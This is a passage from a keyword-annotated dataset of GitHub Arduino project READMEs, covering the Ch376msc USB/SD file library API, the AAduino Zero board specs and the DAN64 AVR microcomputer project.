cshownote. it is located at 0x14733 (firmware #1, #2, #3 and #5). by changing it's first instruction at 0x14733 to 0x22 (ret), we force an immediate return from this function and no pop-up is shown.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000877, "year": null}, {"Unnamed: 0": 2920, "autor": 880, "date": null, "content": "Arduino library for CH376 / CH375 file manager control chip\nSupports read/write files to USB flash drive or SD card (CH375 only support USB flash drive).\nWhy use this chip if there is already a library to handle the SD card and it is easier to just hook up the SD card(with resistors or SD card module) to Arduino? The SD library is widely used and is reliable, the only problem is the Arduino does't have to much memory and with the SD lib the MCU has to cope with the FAT file system, and we're just talking about SD card management, the USB storage drive handling is a more complicated and memory consuming procedure and you need a USB-HOST chip. The CH376 chip easily can write and read files even if they are on SD card or on Usb thumb-drive(CH375 only support USB thumb-drive). The chip supports FAT12, FAT16 and FAT32 file systems, meaning the chip does the hard work, the MCU does not have to deal with the FAT file system, it only sends instructions to the chip on the communication bus you like (SPI, UART (HW serial, SW serial)), and the magic happens in the chip. The chip can do more, e.g to handle HID devices(usb keyboard, mouse, joystick ...) but this feature is not yet used in the library, maybe in the future.\nClick here to see the difference between libraries about memory usage.\nKnown Issues\nSome of these chips are shipped with old firmware( revision number less than 0x43), with these modules you will faces some issues like doesn't recognize a flash drive or it will be unreadable the file created with this chip for Windows and vice versa. For more details click here.\nGetting Started\nConfigure the jumpers on the module depending on which communication protocol you are using(see API reference)\nPCB modding for SD card\nIf you planning to use the chip for SD card also and you have a pcb like on the photo above, then some soldering skill is required. First of all with a DMM check the pins of the chip(26,25,23 and 7) are they floating or connected to GND/VCC. On mine pcb the chip pin 23 (SD_CS) is connected to ground, like you can see here, pins or the chip have incorrect marking(looks like CH375 which one doesn't support SD card) . Link for the module's schematic diagram. I used soldering iron and tweezer to lift up the pin from the pcb(be careful, you can easily break the chip's leg). Follow this schema to make the proper connection between the chip and SD card socket. I used a SD card adapter and for sake of stability, use the capacitors+1R resistor on Vcc line. The SD card operate from 3.3V and this board already have a 3.3V voltage regulator so that is fine. Here are some photos from the ugly modding ;) Photo1 Photo2.\nAPI Reference\n//The default SPI communication speed is reduced to 125 kHz because of stability if long cables or breadboard is used.\n// to change the SPI Clock rate, during instantiation use e.g. SPI_SCK_KHZ(500) - to use 500kHz\n// or e.g. SPI_SCK_MHZ(8) - to use 8MHz (see in examples/lcd_menu)\n//CONSTRUCTORS\n//UART\n//For hardware serial leave the communication settings on the module at default speed (9600bps)\nCh376msc(HardwareSerial, speed);//Select the serial port to which the module is connected and the desired speed(9600, 19200, 57600, 115200)\n//For software serial select the desired communication speed on the module(look on the picture above)\nCh376msc(SoftwareSerial);\n//SPI\n//If no other device is connected to the SPI port it`s possible to save one MCU pin\nCh376msc(spiSelect, *optional SPI CLK rate*);// ! Don`t use this if the SPI port is shared with other devices\n//If the SPI port is shared with other devices, use this constructor and one extra MCU pin need to be sacrificed for the INT pin\nCh376msc(spiSelect, interruptPin, *optional SPI CLK rate*);\n////////////////////\n// Must be initialized before any other command are called from this class.\ninit();\n// call frequently to get any interrupt message of the module(attach/detach drive)\ncheckIntMessage(); //return TRUE if an interrupt request has been received, FALSE if not.\n// can call before any file operation\ndriveReady(); //returns FALSE if no drive is present or TRUE if drive is attached and ready.\n// check the communication between MCU and the CH376\npingDevice(); //returns FALSE if there is a communication failure, TRUE if communication is ok\n// 8.3 filename, also called a short filename is accepted\nsetFileName(filename);//8 char long name + 3 char long extension\n// open file before any file operation. Use first setFileName() function\nopenFile();\n// always call this after finishing with file operations otherwise data loss or file corruption may occur\ncloseFile();\n// repeatedly call this function to read data to buffer until the return value is TRUE\nreadFile(buffer, length);// buffer - char array, buffer size\n// Read text until reach the terminator character, rest is same as readFile\nreadFileUntil(terminator, buffer, length);//returns boolean true if the given buffer\n// is full and not reached the terminator character\n//Same as readFile except the buffer type is byte(uint8) array and not added terminating 0 char\nreadRaw(buffer, length);// buffer - byte array, buffer size\n//Read, extract numbers of txt file, read until reach EOF (see getEOF())\nreadLong(terminator);//returns long value,terminator char is optional, default char is '\\n'\nreadULong(terminator);//returns unsigned long value,terminator char is optional, default char is '\\n'\nreadDouble(terminator);//returns double value,terminator char is optional, default char is '\\n'\n//Write, construct string of number and write on the storage(byte, int, u int, long, u long, double)\nwriteNum(number);// write the given number\nwriteNumln(number);// write the given number in new line\n//Write one character on the storage\nwriteChar(char);// e.g. new line character '\\n' or comma ',' to\n// repeatedly call this function to write data to the drive until there is no more data for write or the return value is FALSE\nwriteFile(buffer, length);// buffer - char array, string size in the buffer\n// switch between source drive's, 0 = USB(default), 1 = SD card\n// !!Before calling this function and activate the SD card please do the required modification\n// on the pcb, please read **PCB modding for SD card** section otherwise you can damage the CH376 chip.\nsetSource(srcDrive);// 0 or 1\nsetYear(year); // 1980 - 2099\nsetMonth(month);// 1 - 12\nsetDay(day);// 1 - 31\nsetHour(hour);// 0 - 23\nsetMinute(minute);// 0 - 59\nsetSecond(second);// 0 - 59 saved with 2 second resolution (0, 2, 4 ... 58)\n// when new file is created the defult file creation date/time is (2004-1-1 0.0.0),\n// it is possible to change date/time with this function, use first set functions above to set the file attributes\nsaveFileAttrb();\n// move the file cursor to specified position\nmoveCursor(position);// 00000000h - FFFFFFFFh\n// delete the specified file, use first setFileName() function\ndeleteFile();\n// delete current directory, except root directory\ndeleteDir();\n// repeatedly call this function with getFileName until the return value is TRUE to get the file names from the current directory\n// limited possibility to use with wildcard character e.g. listDir(\"AB*\") will list files with names starting with AB\n// listDir(\"*AB\") will not work, wildcard char+string must to be less than 8 character long\n// if no argument is passed while calling listDir(), all files will be printed from the current directory\nlistDir();// returns FALSE if no more file is in the current directory\n// reset file process state machine to default\n// useful e.g. to make LCD menu with file's list without using large buffer to store the file names\nresetFileList();\n//dirPath = e.g. \"/DIR1/DIR2/DIR3\" , \"/\" - root dir\n//CreateDir = 0(open directories if they not exist, don`t create them) or 1(create directories if they do not exist and open them)\n//if working in subfolders, before file operations ALWAYS call this function with the full directory path\n//limited to 3 subfolders depth (see /src/Ch376msc.h file. MAXDIRDEPTH) and 8 character long directory names\ncd(dirPath,CreateDir);// returns byte value,see example .ino\ngetFreeSectors();// returns unsigned long value\ngetTotalSectors();// returns unsigned long value\ngetFileSize();// returns unsigned long value (byte)\ngetSource();// returns boolean value, false USB, true SD card\ngetYear();// returns int value\ngetMonth();// returns int value\ngetDay();// returns int value\ngetHour();// returns int value\ngetMinute();// returns int value\ngetSecond();// returns int value\n// get the last error code (see datasheet and/or CommDef.h)\ngetError();// returns byte value\ngetFileSystem();// returns byte value, 01h-FAT12, 02h-FAT16, 03h-FAT32\ngetFileName();// returns the file name in a 11+1 character long string value\ngetFileSizeStr();// returns file size in a formatted 9+1 character long string value\ngetFileAttrb();// returns byte value, see /src/CommDef.h , (File attributes)\ngetCursorPos();// returns unsigned long value\ngetEOF();// returns boolean value, true EOF is reached\ngetChipVer();// returns byte value, returns the CH chip firmware version number\ngetStreamLen();//returns byte value, helper function to readRaw() function, get the stream size issue#35\nFirmware difference\nI finally managed to get a module with outdated firmware and a PC with Win10 OS, so I was able to experiment with what some are complaining about. Modules with an obsolete firmware and a flash drive formatted with Windows 10 inbuilt tool (right click on the drive and choose Format option) are a bad combination (didn't tested with earlier version of Windows OS ). In this case You can try to install a third-party software and do the formatting with that tool, for me on Windows the Active@ Partition Manager from LSoft Technologies did the job.\nThis test is based on my personal experience and may vary depending on the flash drives you use.\nWith calling getChipVer() function you can determine your chip's firmware revision number.\nPendrives factory default formatted or formatted with Windows 10\nFW ver. 2Gb 16Gb 32Gb\n0x43 (67)(new) OK OK OK\n0x42 (66)(old) **FAIL *FAIL **FAIL\nPendrives are formatted with GParted on Linux or with third-party software on Windows\nFW ver. 2Gb 16Gb 32Gb\n0x43 (67)(new) OK OK OK\n0x42 (66)(old) OK *FAIL OK\n*Can't mount the drive\n**Can't read the drive or file created with the module is unreadable for Windows and vice versa\nFlash drives used in test:\nNoName 2Gb USB2.0, IdVendor: 1234, IdProduct: 0201 Brain Actuated Technologies\nPNY 16Gb USB2.0, IdVendor: 058f, IdProduct: 6387 Alcor Micro Corp.\nPNY 32Gb USB3.1, IdVendor: 090c, IdProduct: 2000 Silicon Motion, Inc.\nTested boards\nBoard(arch) SPI HW Serial SW Serial\nArduino (AVR) OK OK OK\nDUE (SAM) OK(with INT pin) OK NO\nZERO (SAMD) OK ? NO\n*STM32 cores OK !NO NO\n**STM32duino OK OK NO\n***ESP8266 OK(with INT pin) NO OK\nESP32 (ref) OK ? ?\nBe careful when choosing SoftSerial because it has its own limitations. See issues#15\n* Tested on NUCLEO F446RE(no signal at all on UART ports)\n** Tested on Generic STM32F103C alias Blue pill with STM32duino bootloader\n*** Tested on NodeMCU,(i'm not familiar with ESP MCUs) it looks they have default enabled WDT so i have to call yield() periodically during file operations, otherwise ESP will restart with a ugly message. Working SPI configuration (for me)is MISO-12(D6), MOSI-13(D7), SCK-14(D5), CS-4(D2), INT-5(D1)\nTest\nI compared the two libraries with the same instructions, create file, write some text in it and read back the created file and send it to serial (SPI used) Used Arduino IDE 1.8.10 on x64 linux, ArduinoUno board choosed\nSketch from SD library(SparkFun 1.2.4) ReadWrite example:\nProgram space used: 10704 bytes 33% ,\nSRAM used: 882 bytes 43%\n#include <SPI.h>\n#include <SD.h>\nFile myFile;\nvoid setup() {\nSerial.begin(9600);\nSD.begin(4);\nmyFile = SD.open(\"TEST.TXT\", FILE_WRITE);\nif (myFile) {\nmyFile.println(\"testing 1, 2, 3.\");\nmyFile.close();\n}\nmyFile = SD.open(\"TEST.TXT\");\nwhile (myFile.available()) {\nSerial.write(myFile.read());\n}\nmyFile.close();\n}\nvoid loop() {}\nSecond sketch is with Ch376msc library(1.4.2)\nif i put in comments the setSorce function and use the default USB storage\nProgram space used: 6760 bytes 20% , SRAM used: 315 bytes 15%\nwith setSorce function choosed USB storage\nProgram space used: 6810 bytes 21% , SRAM used: 315 bytes 15%\nwith setSorce function choosed SD storage\nProgram space used: 6824 bytes 21% , SRAM used: 315 bytes 15%\n#include <Ch376msc.h>\nCh376msc flashDrive(10); // chipSelect\nchar adat[]={\"testing 1, 2, 3.\"};\nboolean readMore = true;\nvoid setup() {\nSerial.begin(9600);\nflashDrive.init();\nflashDrive.setSource(0);//0 - USB, 1 - SD\nflashDrive.setFileName(\"TEST.TXT\");\nflashDrive.openFile();\nflashDrive.writeFile(adat, strlen(adat));\nflashDrive.closeFile();\nflashDrive.setFileName(\"TEST.TXT\");\nflashDrive.openFile();\nwhile(readMore){\nreadMore = flashDrive.readFile(adat, sizeof(adat));\nSerial.print(adat);\n}\nflashDrive.closeFile();\n}\nvoid loop() {}\nAcknowledgments\nThanks for the idea to Scott C\nVersions\nv1.4.5 Mar 17, 2021\nnew functions, getStreamLen(), deleteDir() issue #41, see API\nv1.4.4 Sep 29, 2020\nerror handling improvement\nnew function, getChipVer()\nbug fix, issue #34 Variable Naming conflicts with core ESP32 Variables\nv1.4.3 Feb 06, 2020\nbug fix issue #22 unknown partition\nnew functions as requested in #21 , #23\nreorganizing the library\nadded function-like macros to easy configure the SPI clock rate(see in examples/lcd_menu)\nv1.4.2 Jan 07, 2020\nsupport SD card manage(API ref. - setSource(),if the SD card socket is not available on the module, then modification on the module is required, please read Pcb modding for sd card section)\na new example of using an SD card\nthe checkDrive function name was misleading, renamed to checkIntMessage\nimprovements, bug fixes\nunnecessary examples removed\nv1.4.1 Dec 22, 2019\nsupports more architectures(see Tested boards table below) - issue #11\nconstructor update (BUSY pin is not longer used)\nimproved logic to the mount/unmount flash drive\ndirectory support ( cd(); function )\nuse advanced file listing with (*) wildcard character(API reference, listDir() function)\nv1.4.0 Sep 26, 2019\nnew functions\ngetTotalSectors() - returns a unsigned long number, total sectors on the drive\ngetFreeSectors() - returns a unsigned long number, free sectors on the drive\ngetFileSystem() - returns a byte number, 0x01-FAT12, 0x02-FAT16, 0x03-FAT32\nupdated example files with a new functions\nnew example file, searching for the oldest/newest file on the flash drive\nv1.3.1 Sep 20, 2019\nrearrange the folder structure to be 1.5 library format compatible\nv1.3 Sep 17, 2019\nbug fix for moveCursor issue #3 , minor changes\nv1.2.1 Apr 24, 2019\nIn use of SPI, CS pin on the module must to be pulled to VCC otherwise communication can be unstable on a higher clock rate\nbug fix for timing issue on a higher clock rate (TSC)\nv1.2 Apr 20, 2019\nextended with SPI communication\nv1.1 Feb 25, 2019\ninitial version with UART communication\nLicense\nThe MIT License (MIT)\nCopyright (c) 2019 Gy\u00f6rgy Kov\u00e1cs\nPermission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:\nThe above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.", "link": "https://github.com/djuseeq/Ch376msc", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "arduino library for ch376 / ch375 file manager control chip\nsupports read/write files to usb flash drive or sd card (ch375 only support usb flash drive).\nwhy use this chip if there is already a library to handle the sd card and it is easier to just hook up the sd card(with resistors or sd card module) to arduino? the sd library is widely used and is reliable, the only problem is the arduino does't have to much memory and with the sd lib the mcu has to cope with the fat file system, and we're just talking about sd card management, the usb storage drive handling is a more complicated and memory consuming procedure and you need a usb-host chip. the ch376 chip easily can write and read files even if they are on sd card or on usb thumb-drive(ch375 only support usb thumb-drive). the chip supports fat12, fat16 and fat32 file systems, meaning the chip does the hard work, the mcu does not have to deal with the fat file system, it only sends instructions to the chip on the communication bus you like (spi, uart (hw serial, sw serial)), and the magic happens in the chip. the chip can do more, e.g to handle hid devices(usb keyboard, mouse, joystick ...) but this feature is not yet used in the library, maybe in the future.\nclick here to see the difference between libraries about memory usage.\nknown issues\nsome of these chips are shipped with old firmware( revision number less than 0x43), with these modules you will faces some issues like doesn't recognize a flash drive or it will be unreadable the file created with this chip for windows and vice versa. for more details click here.\ngetting started\nconfigure the jumpers on the module depending on which communication protocol you are using(see api reference)\npcb modding for sd card\nif you planning to use the chip for sd card also and you have a pcb like on the photo above, then some soldering skill is required. first of all with a dmm check the pins of the chip(26,25,23 and 7) are they floating or connected to gnd/vcc. on mine pcb the chip pin 23 (sd_cs) is connected to ground, like you can see here, pins or the chip have incorrect marking(looks like ch375 which one doesn't support sd card) . link for the module's schematic diagram. i used soldering iron and tweezer to lift up the pin from the pcb(be careful, you can easily break the chip's leg). follow this schema to make the proper connection between the chip and sd card socket. i used a sd card adapter and for sake of stability, use the capacitors+1r resistor on vcc line. the sd card operate from 3.3v and this board already have a 3.3v voltage regulator so that is fine. here are some photos from the ugly modding ;) photo1 photo2.\napi reference\n//the default spi communication speed is reduced to 125 khz because of stability if long cables or breadboard is used.\n// to change the spi clock rate, during instantiation use e.g. spi_sck_khz(500) - to use 500khz\n// or e.g. spi_sck_mhz(8) - to use 8mhz (see in examples/lcd_menu)\n//constructors\n//uart\n//for hardware serial leave the communication settings on the module at default speed (9600bps)\nch376msc(hardwareserial, speed);//select the serial port to which the module is connected and the desired speed(9600, 19200, 57600, 115200)\n//for software serial select the desired communication speed on the module(look on the picture above)\nch376msc(softwareserial);\n//spi\n//if no other device is connected to the spi port it`s possible to save one mcu pin\nch376msc(spiselect, *optional spi clk rate*);// ! don`t use this if the spi port is shared with other devices\n//if the spi port is shared with other devices, use this constructor and one extra mcu pin need to be sacrificed for the int pin\nch376msc(spiselect, interruptpin, *optional spi clk rate*);\n////////////////////\n// must be initialized before any other command are called from this class.\ninit();\n// call frequently to get any interrupt message of the module(attach/detach drive)\ncheckintmessage(); //return true if an interrupt request has been received, false if not.\n// can call before any file operation\ndriveready(); //returns false if no drive is present or true if drive is attached and ready.\n// check the communication between mcu and the ch376\npingdevice(); //returns false if there is a communication failure, true if communication is ok\n// 8.3 filename, also called a short filename is accepted\nsetfilename(filename);//8 char long name + 3 char long extension\n// open file before any file operation. use first setfilename() function\nopenfile();\n// always call this after finishing with file operations otherwise data loss or file corruption may occur\nclosefile();\n// repeatedly call this function to read data to buffer until the return value is true\nreadfile(buffer, length);// buffer - char array, buffer size\n// read text until reach the terminator character, rest is same as readfile\nreadfileuntil(terminator, buffer, length);//returns boolean true if the given buffer\n// is full and not reached the terminator character\n//same as readfile except the buffer type is byte(uint8) array and not added terminating 0 char\nreadraw(buffer, length);// buffer - byte array, buffer size\n//read, extract numbers of txt file, read until reach eof (see geteof())\nreadlong(terminator);//returns long value,terminator char is optional, default char is '\\n'\nreadulong(terminator);//returns unsigned long value,terminator char is optional, default char is '\\n'\nreaddouble(terminator);//returns double value,terminator char is optional, default char is '\\n'\n//write, construct string of number and write on the storage(byte, int, u int, long, u long, double)\nwritenum(number);// write the given number\nwritenumln(number);// write the given number in new line\n//write one character on the storage\nwritechar(char);// e.g. new line character '\\n' or comma ',' to\n// repeatedly call this function to write data to the drive until there is no more data for write or the return value is false\nwritefile(buffer, length);// buffer - char array, string size in the buffer\n// switch between source drive's, 0 = usb(default), 1 = sd card\n// !!before calling this function and activate the sd card please do the required modification\n// on the pcb, please read **pcb modding for sd card** section otherwise you can damage the ch376 chip.\nsetsource(srcdrive);// 0 or 1\nsetyear(year); // 1980 - 2099\nsetmonth(month);// 1 - 12\nsetday(day);// 1 - 31\nsethour(hour);// 0 - 23\nsetminute(minute);// 0 - 59\nsetsecond(second);// 0 - 59 saved with 2 second resolution (0, 2, 4 ... 58)\n// when new file is created the defult file creation date/time is (2004-1-1 0.0.0),\n// it is possible to change date/time with this function, use first set functions above to set the file attributes\nsavefileattrb();\n// move the file cursor to specified position\nmovecursor(position);// 00000000h - ffffffffh\n// delete the specified file, use first setfilename() function\ndeletefile();\n// delete current directory, except root directory\ndeletedir();\n// repeatedly call this function with getfilename until the return value is true to get the file names from the current directory\n// limited possibility to use with wildcard character e.g. listdir(\"ab*\") will list files with names starting with ab\n// listdir(\"*ab\") will not work, wildcard char+string must to be less than 8 character long\n// if no argument is passed while calling listdir(), all files will be printed from the current directory\nlistdir();// returns false if no more file is in the current directory\n// reset file process state machine to default\n// useful e.g. to make lcd menu with file's list without using large buffer to store the file names\nresetfilelist();\n//dirpath = e.g. \"/dir1/dir2/dir3\" , \"/\" - root dir\n//createdir = 0(open directories if they not exist, don`t create them) or 1(create directories if they do not exist and open them)\n//if working in subfolders, before file operations always call this function with the full directory path\n//limited to 3 subfolders depth (see /src/ch376msc.h file. maxdirdepth) and 8 character long directory names\ncd(dirpath,createdir);// returns byte value,see example .ino\ngetfreesectors();// returns unsigned long value\ngettotalsectors();// returns unsigned long value\ngetfilesize();// returns unsigned long value (byte)\ngetsource();// returns boolean value, false usb, true sd card\ngetyear();// returns int value\ngetmonth();// returns int value\ngetday();// returns int value\ngethour();// returns int value\ngetminute();// returns int value\ngetsecond();// returns int value\n// get the last error code (see datasheet and/or commdef.h)\ngeterror();// returns byte value\ngetfilesystem();// returns byte value, 01h-fat12, 02h-fat16, 03h-fat32\ngetfilename();// returns the file name in a 11+1 character long string value\ngetfilesizestr();// returns file size in a formatted 9+1 character long string value\ngetfileattrb();// returns byte value, see /src/commdef.h , (file attributes)\ngetcursorpos();// returns unsigned long value\ngeteof();// returns boolean value, true eof is reached\ngetchipver();// returns byte value, returns the ch chip firmware version number\ngetstreamlen();//returns byte value, helper function to readraw() function, get the stream size issue#35\nfirmware difference\ni finally managed to get a module with outdated firmware and a pc with win10 os, so i was able to experiment with what some are complaining about. modules with an obsolete firmware and a flash drive formatted with windows 10 inbuilt -----> tool !!!  (right click on the drive and choose format option) are a bad combination (didn't tested with earlier version of windows os ). in this case you can try to install a third-party software and do the formatting with that tool, for me on windows the active@ partition manager from lsoft technologies did the job.\nthis test is based on my personal experience and may vary depending on the flash drives you use.\nwith calling getchipver() function you can determine your chip's firmware revision number.\npendrives factory default formatted or formatted with windows 10\nfw ver. 2gb 16gb 32gb\n0x43 (67)(new) ok ok ok\n0x42 (66)(old) **fail *fail **fail\npendrives are formatted with gparted on linux or with third-party software on windows\nfw ver. 2gb 16gb 32gb\n0x43 (67)(new) ok ok ok\n0x42 (66)(old) ok *fail ok\n*can't mount the drive\n**can't read the drive or file created with the module is unreadable for windows and vice versa\nflash drives used in test:\nnoname 2gb usb2.0, idvendor: 1234, idproduct: 0201 brain actuated technologies\npny 16gb usb2.0, idvendor: 058f, idproduct: 6387 alcor micro corp.\npny 32gb usb3.1, idvendor: 090c, idproduct: 2000 silicon motion, inc.\ntested boards\nboard(arch) spi hw serial sw serial\narduino (avr) ok ok ok\ndue (sam) ok(with int pin) ok no\nzero (samd) ok ? no\n*stm32 cores ok !no no\n**stm32duino ok ok no\n***esp8266 ok(with int pin) no ok\nesp32 (ref) ok ? ?\nbe careful when choosing softserial because it has its own limitations. see issues#15\n* tested on nucleo f446re(no signal at all on uart ports)\n** tested on generic stm32f103c alias blue pill with stm32duino bootloader\n*** tested on nodemcu,(i'm not familiar with esp mcus) it looks they have default enabled wdt so i have to call yield() periodically during file operations, otherwise esp will restart with a ugly message. working spi configuration (for me)is miso-12(d6), mosi-13(d7), sck-14(d5), cs-4(d2), int-5(d1)\ntest\ni compared the two libraries with the same instructions, create file, write some text in it and read back the created file and send it to serial (spi used) used arduino ide 1.8.10 on x64 linux, arduinouno board choosed\nsketch from sd library(sparkfun 1.2.4) readwrite example:\nprogram space used: 10704 bytes 33% ,\nsram used: 882 bytes 43%\n#include <spi.h>\n#include <sd.h>\nfile myfile;\nvoid setup() {\nserial.begin(9600);\nsd.begin(4);\nmyfile = sd.open(\"test.txt\", file_write);\nif (myfile) {\nmyfile.println(\"testing 1, 2, 3.\");\nmyfile.close();\n}\nmyfile = sd.open(\"test.txt\");\nwhile (myfile.available()) {\nserial.write(myfile.read());\n}\nmyfile.close();\n}\nvoid loop() {}\nsecond sketch is with ch376msc library(1.4.2)\nif i put in comments the setsorce function and use the default usb storage\nprogram space used: 6760 bytes 20% , sram used: 315 bytes 15%\nwith setsorce function choosed usb storage\nprogram space used: 6810 bytes 21% , sram used: 315 bytes 15%\nwith setsorce function choosed sd storage\nprogram space used: 6824 bytes 21% , sram used: 315 bytes 15%\n#include <ch376msc.h>\nch376msc flashdrive(10); // chipselect\nchar adat[]={\"testing 1, 2, 3.\"};\nboolean readmore = true;\nvoid setup() {\nserial.begin(9600);\nflashdrive.init();\nflashdrive.setsource(0);//0 - usb, 1 - sd\nflashdrive.setfilename(\"test.txt\");\nflashdrive.openfile();\nflashdrive.writefile(adat, strlen(adat));\nflashdrive.closefile();\nflashdrive.setfilename(\"test.txt\");\nflashdrive.openfile();\nwhile(readmore){\nreadmore = flashdrive.readfile(adat, sizeof(adat));\nserial.print(adat);\n}\nflashdrive.closefile();\n}\nvoid loop() {}\nacknowledgments\nthanks for the idea to scott c\nversions\nv1.4.5 mar 17, 2021\nnew functions, getstreamlen(), deletedir() issue #41, see api\nv1.4.4 sep 29, 2020\nerror handling improvement\nnew function, getchipver()\nbug fix, issue #34 variable naming conflicts with core esp32 variables\nv1.4.3 feb 06, 2020\nbug fix issue #22 unknown partition\nnew functions as requested in #21 , #23\nreorganizing the library\nadded function-like macros to easy configure the spi clock rate(see in examples/lcd_menu)\nv1.4.2 jan 07, 2020\nsupport sd card manage(api ref. - setsource(),if the sd card socket is not available on the module, then modification on the module is required, please read pcb modding for sd card section)\na new example of using an sd card\nthe checkdrive function name was misleading, renamed to checkintmessage\nimprovements, bug fixes\nunnecessary examples removed\nv1.4.1 dec 22, 2019\nsupports more architectures(see tested boards table below) - issue #11\nconstructor update (busy pin is not longer used)\nimproved logic to the mount/unmount flash drive\ndirectory support ( cd(); function )\nuse advanced file listing with (*) wildcard character(api reference, listdir() function)\nv1.4.0 sep 26, 2019\nnew functions\ngettotalsectors() - returns a unsigned long number, total sectors on the drive\ngetfreesectors() - returns a unsigned long number, free sectors on the drive\ngetfilesystem() - returns a byte number, 0x01-fat12, 0x02-fat16, 0x03-fat32\nupdated example files with a new functions\nnew example file, searching for the oldest/newest file on the flash drive\nv1.3.1 sep 20, 2019\nrearrange the folder structure to be 1.5 library format compatible\nv1.3 sep 17, 2019\nbug fix for movecursor issue #3 , minor changes\nv1.2.1 apr 24, 2019\nin use of spi, cs pin on the module must to be pulled to vcc otherwise communication can be unstable on a higher clock rate\nbug fix for timing issue on a higher clock rate (tsc)\nv1.2 apr 20, 2019\nextended with spi communication\nv1.1 feb 25, 2019\ninitial version with uart communication\nlicense\nthe mit license (mit)\ncopyright (c) 2019 gy\u00f6rgy kov\u00e1cs\npermission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"software\"), to deal in the software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the software, and to permit persons to whom the software is furnished to do so, subject to the following conditions:\nthe above copyright notice and this permission notice shall be included in all copies or substantial portions of the software.\nthe software is provided \"as is\", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose and noninfringement. in no event shall the authors or copyright holders be liable for any claim, damages or other liability, whether in an action of contract, tort or otherwise, arising from, out of or in connection with the software or the use or other dealings in the software.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000880, "year": null}, {"Unnamed: 0": 2981, "autor": 941, "date": null, "content": "The AAduino Zero\nThe AAduino Zero (blog post) is the successor of the AAduino and is still the same size as an AA battery. This repo contains software for the AAduino Zero and will eventually hold the hardware schematics.\nThere's lots of example code available, and a simple serial tool for flashing these.\nAAduino Zero specs\nSTM32L052 micro controller with 32kb flash, 8kb RAM, 2kB EEPROM\nRFM68CW radio module\nTMP102 temperature sensor\n4Mbit serial flash for sensor data logging and wireless firmware upgrades\n32kHz oscillator for RTC\nActivity LED\nReverse polarity protection\n1x digital/analog I/O port\nUART port on 0.1\u201d header\nPre-programmed with a serial boot loader capable of handling firmware upgrades via radio or the UART.\nMinimum supply voltage: 1.8V\nMaximum supply voltage: 3.6V\nMinimum power consumption: 8\u03bcA. Yes, eight microamps.", "link": "https://github.com/kanflo/aaduino-zero", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "the aaduino zero\nthe aaduino zero (blog post) is the successor of the aaduino and is still the same size as an aa battery. this repo contains software for the aaduino zero and will eventually hold the hardware schematics.\nthere's lots of example code available, and a simple serial -----> tool !!!  for flashing these.\naaduino zero specs\nstm32l052 micro controller with 32kb flash, 8kb ram, 2kb eeprom\nrfm68cw radio module\ntmp102 temperature sensor\n4mbit serial flash for sensor data logging and wireless firmware upgrades\n32khz oscillator for rtc\nactivity led\nreverse polarity protection\n1x digital/analog i/o port\nuart port on 0.1\u201d header\npre-programmed with a serial boot loader capable of handling firmware upgrades via radio or the uart.\nminimum supply voltage: 1.8v\nmaximum supply voltage: 3.6v\nminimum power consumption: 8\u03bca. yes, eight microamps.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000941, "year": null}, {"Unnamed: 0": 2985, "autor": 945, "date": null, "content": "DAN64, an AVR based 8-bit microcomputer\nThis is my personal attempt to build a 8-bit microcomputer based on the popular ATmega328 microcontroller (MCU) as an excuse to learn some electronics. Check docs/ directory for further information.\nThe microcomputer can be assembled and run in a breadboard with an Arduino Uno board.\nGeneral features:\nComposite video black and white output, 256 x 192 resolution, 32 x 24 characters (8 x 8 pixels font, code page 437 character set).\nPS/2 keyboard support.\n6502 virtual machine with system call interface to native code services.\nLinear 64KB memory access from the virtual machine (256 bytes page zero, 256 bytes hardware stack, 6144 bytes of video RAM and 58880 bytes for user programs).\nExternal storage support via audio in/out.\nIntegrated 6502 assembler and disassembler.\nBasic shell supporting peek, poke, load, run, etc.\nProject page: http://www.usebox.net/jjm/dan64/\nGeneral directory structure\ndocs/: documentation of the project, including schematics.\nsource code:\ninclude/: general include files.\ninit/: main entry point for the firmware, including the implementation of the syscalls.\nvideo/: composite video generation.\ninput/: PS/2 keyboard support.\nmemory/: memory functions.\nvm/: 6502 virtual machine.\ntest/: virtual machine test suite.\nstorage/: storage using audio in/out.\ntools/: wav audio file encoder.\ndasm/: DAN64 assembler/disassembler.\ntools/: standalone version.\ntools/: some misc auxiliary tools (eg, font bitmap generation).\ncc65/: CC65 runtime for cross-compiling C programs.\nexamples/: several user program examples in ca65 assembler and C.\nimages/: logos, pictures, screenshots, etc.\nBuild instructions\nInstall GCC AVR compiler and toolchain, and run make in the top level directory.\nIf avrdude is installed and you want to deploy to an Arduino Uno board you can try make upload, although some tweaking may be required (eg, the USB port).\nThe examples and the CC65 runtime require the CC65 compiler. If the binaries are in your path, just use make.\nThe user programs can be encoded into audio using the encode tool in the storage module (requires POSIX getopt and libsndfile).\nPandoc is required to build the documentation (although it is readable as it is in markdown format).\nNotes\nVideo:\nTiming is set for PAL.\nOutput is de-interlaced.\nIt may require set TV's AFC (Automatic Frequency Control) to \"mode2\" (usually for VCRs or Camcorders).\nInput:\nSupported UK PS/2 